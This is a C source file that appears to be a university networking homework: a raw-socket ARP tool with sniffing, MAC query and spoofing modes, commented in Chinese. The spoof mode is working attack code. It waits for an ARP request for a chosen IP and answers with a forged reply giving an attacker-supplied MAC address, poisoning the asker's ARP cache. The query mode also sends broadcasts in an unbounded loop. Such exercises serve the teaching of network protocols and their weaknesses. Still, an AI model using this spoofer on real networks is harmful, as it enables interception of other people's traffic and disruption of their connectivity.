#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include "arp.h"

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <signal.h>

/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
#define DEVICE_NAME "enp2s0f5"

/* 以太Header長度 */
#define ETHER_HEADER_LEN sizeof(struct ether_header)
/* arp payload長度 */
#define ETHER_ARP_LEN sizeof(struct ether_arp)
/* Arp packet len = 以太header + arp payload長度 */
#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */

struct arp_packet *Set_arp_packet(const unsigned char *send_mac, const char *send_ip, const char *target_ip ) {

 	struct arp_packet *packet = (struct arp_packet*)malloc(ETHER_HEADER_LEN+ETHER_ARP_LEN)  ;
	struct in_addr send_in_addr, target_in_addr ;
	unsigned char Target_mac_addr[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff} ; // 廣播

	// -----乙太header-------
	memcpy( packet->eth_hdr.ether_shost, send_mac, ETH_ALEN ) ;
	memcpy( packet->eth_hdr.ether_dhost, Target_mac_addr, ETH_ALEN ) ;
	packet->eth_hdr.ether_type = htons( ETHERTYPE_ARP ) ; // 0x0806

	// -----Arp payload------
    // IP地址轉成網路格式的二進制
    inet_pton(PF_INET, send_ip, &send_in_addr);
    inet_pton(PF_INET, target_ip, &target_in_addr);

	// htons: host to net short
    packet->arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER); // format of hardware address  
    packet->arp.ea_hdr.ar_pro = htons(ETHERTYPE_IP); // format of protocol address
    packet->arp.ea_hdr.ar_hln = ETH_ALEN; // length of hardware address
    packet->arp.ea_hdr.ar_pln = 4 ; 	// length of protocol address
    packet->arp.ea_hdr.ar_op = htons(ARPOP_REQUEST); // ARP opcode
    memcpy(packet->arp.arp_sha, send_mac, ETH_ALEN);  
    memset(packet->arp.arp_tha, 0x00, 6 ); // 不知道對方的mac多少，空白
    memcpy(packet->arp.arp_spa, &send_in_addr, 4 );
    memcpy(packet->arp.arp_tpa, &target_in_addr, 4 );

    return packet ;
} // Set_arp_packet

int main(int argc, char* argv[]) {
	int sockfd_recv = 0, sockfd_send = 0; // 套接字(BSD)、端點的抽象表示
	struct sockaddr_ll sa, reva; // 發送、接收的socket環境設定
	struct ifreq req, replyq;  // 發送、接收的網卡資訊
	// struct in_addr myip;
	struct arp_packet buf ; // 接收的封包
	struct arp_packet *send_packet ; // 發送的封包
	char *send_ip, *target_ip, *reply_send_ip ; 
	unsigned char send_mac[ETH_ALEN] ; // 設定要broadcast的封包會用到，自己的MAC
 	bzero(&sa, sizeof(struct sockaddr_ll));
 	bzero(&req, sizeof(struct ifreq));
	// -----------------statement-----------------------
	// 判斷是否以root權限執行
	if ( getuid() != 0 ) {
		printf("ERROR: You must be root to use this tool!\n" ) ;
		return 0 ;
	} // if
	else {
		printf("[ ARP sniffer and spoof program ]\n") ;
	} // else 
	// 判斷指令數量、並顯示功能
	if ( argc < 3 || strcmp( argv[1], "-help" ) == 0 ) {
		printf("Format :\n") ;
		printf("1) ./arp -l -a\n") ;
		printf("2) ./arp -l <filter_ip_address>\n") ;
		printf("3) ./arp -q <query_ip_address>\n") ;
		printf("4) ./arp <fake_mac_address> <target_ip_address>\n") ;
		return 0 ;
	} // if 

	if ( strcmp( argv[1], "-l" ) == 0 ) { 	// ------Type 1 and 2----------- 
		// ------Type 1 and 2----------- 
		if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
		{
			perror("open recv socket error");
			exit(1);
		} // if

		// 設定ifreq的Devicename，來ioctl獲取網卡資訊
		strcpy( req.ifr_ifrn.ifrn_name , DEVICE_NAME ) ;
		if ( ioctl( sockfd_recv, SIOCGIFINDEX, &req ) < 0 ) perror("ioctl error\n") ;

		// bind、設定sockaddr_ll: 數據連接層通用的頭結構
		sa.sll_ifindex = req.ifr_ifru.ifru_ivalue ;
		sa.sll_protocol = htons(ETH_P_ARP) ; 
		sa.sll_family = PF_PACKET ;
		/*
		* Use recvfrom function to get packet.
		* recvfrom( ... )
		*/
		int recv_len = 0 ;
		printf("### ARP sniffer mode ###\n") ;
		socklen_t sa_size = sizeof(sa) ;
		while(1) {
			recv_len = recvfrom( sockfd_recv, &buf, sizeof(buf), 0, (struct sockaddr*) &sa, &sa_size ) ;
			if ( recv_len > 0 ) {
				if ( ntohs(buf.arp.ea_hdr.ar_op) == 1 ) {
					// opcode: request
					if ( strcmp( argv[2], "-a" ) == 0 ){
					//---------------- Type 1 -----------------
						printf("Get ARP packet - Who has ") ;
						for ( int i = 0; i < 4 ; i++) {
							printf("%u",buf.arp.arp_tpa[i]);
							if ( i != 3 ) printf(".") ; 
						} // for
						printf(" ?		Tell " ) ;
						for ( int i = 0; i < 4 ; i++) {
							printf("%u",buf.arp.arp_spa[i]);
							if ( i != 3 ) printf(".") ;   
						} // for
						printf("\n") ;
					} // if 
					else {
					//---------------- Type 2 -----------------
						// 將unit8_t轉成IP位址
						char Targetaddress[100] = "";
						sprintf(Targetaddress, "%u.%u.%u.%u", buf.arp.arp_tpa[0], buf.arp.arp_tpa[1], buf.arp.arp_tpa[2], buf.arp.arp_tpa[3]);
						// 印出特定ip packet
						if ( strcmp( Targetaddress, argv[2] ) == 0 ) {
							printf("Get ARP packet - Who has %s?	Tell ", Targetaddress ) ;
							for ( int i = 0; i < 4 ; i++) {
								printf("%u",buf.arp.arp_spa[i]);
								if ( i != 3 ) printf(".") ;   
							} // for
							printf("\n") ;
						} // if 
					} // else 
				} // if 
			} // if 
		} // while

	} // if
	else if ( strcmp( argv[1], "-q" ) == 0 ) { // ----------Type 3------------
	// -----------------Type 3---------------------
		pid_t pid ; 
		switch( pid = fork() ) {

			case -1 : 
				perror("fork()") ;
				exit(-1) ;
			case 0 :  // 子--------發送ARP封包----------
				if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
					perror("open send socket error");
					exit(sockfd_send);
				} // if 

				// --------------透過ioctl獲取網卡資訊------------------
				strcpy( req.ifr_ifrn.ifrn_name , DEVICE_NAME ) ;

				// 得先抓到網卡號碼，才能ioctol抓IP&MAC！！！！
				if ( ioctl( sockfd_send, SIOCGIFINDEX, &req ) < 0 ) perror("ioctl Devicenum error\n") ;
				sa.sll_ifindex = req.ifr_ifru.ifru_ivalue ;
				sa.sll_family = PF_PACKET ;

				// 取出網卡IP(send ip)及 目的地IP
				if ( ioctl( sockfd_send, SIOCGIFADDR, &req ) < 0 ) perror("ioctl IP error\n") ;
				send_ip = inet_ntoa(((struct sockaddr_in *)&(req.ifr_addr))->sin_addr);
			
				// MAC地址
				if ( ioctl( sockfd_send, SIOCGIFHWADDR, &req ) < 0 ) perror("ioctl MAC error\n") ;
				memcpy( send_mac, req.ifr_ifru.ifru_hwaddr.sa_data, ETH_ALEN ) ;  

				// ------------設定sockaddr_ll: 數據連接層通用的頭結構--------------
				sa.sll_protocol = htons(ETH_P_ARP) ; 
				sa.sll_halen = 6 ;

				// ------------設定並發送ARP封包----------------
				// 廣播封包：以太header的target_mac全是1(broadcast) / arp payload的target_mac全0
				send_packet = Set_arp_packet( send_mac, send_ip, argv[2] ) ;
				while( 1 ) {
					int len = sendto( sockfd_send, send_packet, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr*)&sa, sizeof(sa) ) ;
					if ( len < 0 ) perror( "send" ) ; 
				} // while
	
				break ; 

			default : // 父------------聽取Reply的封包、印出詢問IP的MAC-----------------
				printf("### ARP query mode ###\n") ;
				if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
					perror("open recv socket error");
					exit(1);
				} // if
				// 設定ifreq的Devicename，來ioctl獲取網卡資訊
				strcpy( replyq.ifr_ifrn.ifrn_name , DEVICE_NAME ) ;
				if ( ioctl( sockfd_recv, SIOCGIFINDEX, &replyq ) < 0 ) perror("ioctl error\n") ;
				// 取出自己的IP(send ip)
				if ( ioctl( sockfd_recv, SIOCGIFADDR, &replyq ) < 0 ) perror("ioctl IP error\n") ;
				reply_send_ip = inet_ntoa(((struct sockaddr_in *)&(replyq.ifr_addr))->sin_addr);

				// bind、設定sockaddr_ll: 數據連接層通用的頭結構
				reva.sll_ifindex = replyq.ifr_ifru.ifru_ivalue ;
				reva.sll_family = PF_PACKET ;
				int recv_len = 0 ;
				char Targetaddress[100] = ""; // Reply的收件人
				char Sendaddress[100] = ""; // Reply的寄件人
				socklen_t recv_size = sizeof(sa) ;
				while(1) {
					recv_len = recvfrom( sockfd_recv, &buf, sizeof(buf), 0, (struct sockaddr*) &reva, &recv_size ) ;
					// 讀取reply、確定是目的地的回復且是給我的
					if ( ntohs(buf.arp.ea_hdr.ar_op) == 2 ) {
						sprintf(Targetaddress, "%u.%u.%u.%u", buf.arp.arp_tpa[0], buf.arp.arp_tpa[1], buf.arp.arp_tpa[2], buf.arp.arp_tpa[3]);
						sprintf(Sendaddress, "%u.%u.%u.%u", buf.arp.arp_spa[0], buf.arp.arp_spa[1], buf.arp.arp_spa[2], buf.arp.arp_spa[3]);
						if( strcmp( Targetaddress, reply_send_ip ) == 0 && strcmp( Sendaddress, argv[2] ) == 0 ) {
							// 將unit8_t[18]轉成char[6]位址
							printf( "MAC address of %s is %02x:%02x:%02x:%02x:%02x:%02x\n", argv[2],
									buf.arp.arp_sha[0], buf.arp.arp_sha[1], buf.arp.arp_sha[2], 
									buf.arp.arp_sha[3], buf.arp.arp_sha[4], buf.arp.arp_sha[5]  ) ;
     						int ret = kill(pid, SIGKILL); // 把子程序kill，不然他會一直broadcast
							close(sockfd_send) ; 
							close(sockfd_recv) ;
							return 0 ;
						} // if
					} // if 
				} // while
				break ; 
		} // switch 
	} // else if
	else { // ------Type 4---------

		// -------聽到有人發出request詢問目標的MAC， reply錯誤的資訊(MAC)給他------------
		if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
			perror("open recv socket error");
			exit(1);
		} // if
		else {
			printf("### ARP spoof mode ###\n") ;
		} // else 
		// 設定ifreq的Devicename，來ioctl獲取網卡資訊
		strcpy( req.ifr_ifrn.ifrn_name , DEVICE_NAME ) ;
		if ( ioctl( sockfd_recv, SIOCGIFINDEX, &req ) < 0 ) perror("ioctl error\n") ;
		// bind、設定sockaddr_ll: 數據連接層通用的頭結構
		sa.sll_ifindex = req.ifr_ifru.ifru_ivalue ;
		sa.sll_protocol = htons(ETH_P_ARP) ; 
		sa.sll_family = PF_PACKET ;
		int recv_len = 0 ;
		char request_targetaddress[100] = "";
		socklen_t sa_size = sizeof(sa) ;
		while(1) {
			recv_len = recvfrom( sockfd_recv, &buf, sizeof(buf), 0, (struct sockaddr*) &sa, &sa_size ) ;
			if ( recv_len > 0 ) {
				if ( ntohs(buf.arp.ea_hdr.ar_op) == 1 ) {  // opcode: request
					// 將unit8_t轉成IP位址
					sprintf(request_targetaddress, "%u.%u.%u.%u", buf.arp.arp_tpa[0], buf.arp.arp_tpa[1], buf.arp.arp_tpa[2], buf.arp.arp_tpa[3]);
					// 聽有沒有人發出詢問目標MAC的request
					if ( strcmp( request_targetaddress, argv[2] ) == 0 ) {
						printf("Get ARP packet - Who has %s?	Tell ", request_targetaddress ) ;
						for ( int i = 0; i < 4 ; i++) {
							printf("%u",buf.arp.arp_spa[i]);
							if ( i != 3 ) printf(".") ;   
						} // for
						printf("\n") ;
						break ;
					} // if 
				} // else 
			} // if 
		} // while

		// -------------準備發送假封包--------------
		if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
			perror("open send socket error");
			exit(sockfd_send);
		} // if 
		// --------------透過ioctl獲取網卡資訊------------------
		strcpy( replyq.ifr_ifrn.ifrn_name , DEVICE_NAME ) ;
		// 得先抓到網卡號碼，才能ioctol抓IP&MAC！！！！
		if ( ioctl( sockfd_send, SIOCGIFINDEX, &replyq ) < 0 ) perror("ioctl Devicenum error\n") ;
		reva.sll_ifindex = replyq.ifr_ifru.ifru_ivalue ;
		reva.sll_family = PF_PACKET ;

		// 假的Mac地址，轉成6bytes
		unsigned char send_mac[6] ;
		sscanf(argv[1],"%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
				send_mac, send_mac+1, send_mac+2, send_mac+3, send_mac+4, send_mac+5 );
		
		// ------------設定sockaddr_ll: 數據連接層通用的頭結構--------------
		reva.sll_protocol = htons(ETH_P_ARP) ; 
		reva.sll_halen = 6 ;

		// ------------設定並發送fake封包----------------
		// request是broadcast，reply只送給一個人(request的人)
		// Set_arp_packet()函式原本是用來設定broadcast封包的，得額外改成reply格式的packet
		send_ip = inet_ntoa(((struct sockaddr_in *)&(req.ifr_addr))->sin_addr); // 無用，之後會改
		send_packet = Set_arp_packet( send_mac, send_ip, request_targetaddress ) ; // 後兩個參數是錯的，下面直接設定

		memcpy( send_packet->eth_hdr.ether_dhost, buf.eth_hdr.ether_shost, ETH_ALEN ) ;
		memcpy( send_packet->arp.arp_tha, buf.arp.arp_sha, ETH_ALEN ) ;
		memcpy( send_packet->arp.arp_spa, buf.arp.arp_tpa, 4 ) ; // send_ip設成發問者所問的IP，假裝對的人回
		memcpy( send_packet->arp.arp_tpa, buf.arp.arp_spa, 4 ) ; // target_ip設成發問者的IP，假裝對的人回
		send_packet->arp.ea_hdr.ar_op = htons(ARPOP_REPLY) ;
	
		//int i = 100000 ;
		// while( i-- ) {
			int len = sendto( sockfd_send, send_packet, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr*)&sa, sizeof(sa) ) ;
			if ( len < 0 ) perror( "send" ) ; 
		// } // while

		printf("Send ARP Reply : %s is %02x:%02x:%02x:%02x:%02x:%02x\nSend Successful.\n", request_targetaddress
				, send_mac[0],send_mac[1],send_mac[2],send_mac[3],send_mac[4],send_mac[5]  ) ;

	} // else 

	return 0;
}

